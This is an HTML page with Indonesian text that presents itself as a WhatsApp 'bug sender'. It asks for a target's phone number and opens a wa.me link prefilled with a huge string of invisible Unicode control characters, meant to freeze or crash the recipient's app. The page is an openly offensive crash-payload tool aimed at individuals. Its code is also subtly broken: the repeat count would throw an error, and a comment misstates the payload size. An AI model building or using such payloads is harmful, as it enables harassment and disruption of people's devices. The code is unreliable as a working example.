<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>WhatsApp Bug Sender - All Blank UI</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      padding: 50px;
      text-align: center;
    }
    h1 {
      color: #25D366;
    }
    input {
      width: 300px;
      padding: 12px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 20px;
    }
    button {
      padding: 12px 24px;
      background-color: #25D366;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #128C7E;
    }
  </style>
</head>
<body>
  <h1>üíÄ Kirim Bug WhatsApp - Blank Crash</h1>
  <p>Masukkan nomor target (format 62...):</p>
  <input type="text" id="nomor" placeholder="Contoh: 6281234567890"><br>
  <button onclick="kirimBug()">üö® Kirim Sekarang</button>

  <script>
    // Payload bug blank UI delay permanen (invisible chars)
    const bugBlank = (
      "\u2063\u200f\u202e\u202a\u202d\u202b\u200b\u200c\u200d\u2060\u2061\u2062\u2064\u061C\uFEFF\u00AD"
    ).repeat(9999999999999999); // Lebih dari 600.000 karakter invisible

    function kirimBug() {
      const nomor = document.getElementById("nomor").value.trim();
      if (!nomor || !nomor.startsWith("62")) {
        alert("‚ùå Nomor tidak valid. Harus diawali dengan 62.");
        return;
      }

      const pesan = encodeURIComponent(bugBlank);
      const url = `https://wa.me/${nomor}?text=${pesan}`;
      window.open(url, "_blank");
    }
  </script>
</body>
</html>
